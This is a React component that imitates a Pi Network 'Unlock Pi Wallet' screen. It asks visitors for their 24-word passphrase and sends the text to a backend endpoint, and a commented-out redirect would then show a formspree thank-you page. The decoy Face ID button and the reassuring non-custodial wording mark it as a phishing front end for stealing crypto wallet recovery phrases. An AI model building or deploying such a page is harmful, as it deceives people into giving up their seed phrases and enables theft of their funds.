import './App.css';
import { useFormik } from 'formik';
import axios from 'axios'
import * as Yup from 'yup';
let schema = Yup.object().shape({
  message: Yup.string().required("Invalid passphrase"),
});

function App() {
  const formik = useFormik({
    initialValues: {
      message : ""
    },
    validationSchema: schema,
    onSubmit: async(values)=>{
      const response = await axios.post(`http://localhost:5000/auth/send`, values);
      console.log(response);
      //if(response.data){
       // window.location.replace("https://formspree.io/thanks?language=en#home");
        
      //}
      },
  });

  return (
    <div class="layout">
    <h6>Unlock Pi Wallet</h6>
    <form onSubmit={formik.handleSubmit}>
    <textarea placeholder="Enter your 24-word passphrase here" onChange={formik.handleChange("message")} value={formik.values.message}></textarea>
    <div class="erbox" >
    {formik.touched.message && formik.errors.message ? <div class="text  text-base">
            {formik.touched.message && formik.errors.message}
          </div> : <></>}
      <input type="submit" class="btn uwp" value='Unlock With Passphrase' />
      <div className="btn biob capz">Unlock With Face ID</div>    
    </div> 
    </form>
    <p class="below-text">As a non-custodial wallet, your wallet passphrase is
        exclusively accessible only to you. Recovery of passphrase
        is currently impossible.<br/><br/>
        Lost your passphrase? <a className="link" href="https://minepi.com/" >You can create a new wallet,</a> but all your π
        in your previous wallet will be inaccessible.
    </p>
    </div>
    
  );
}

export default App;
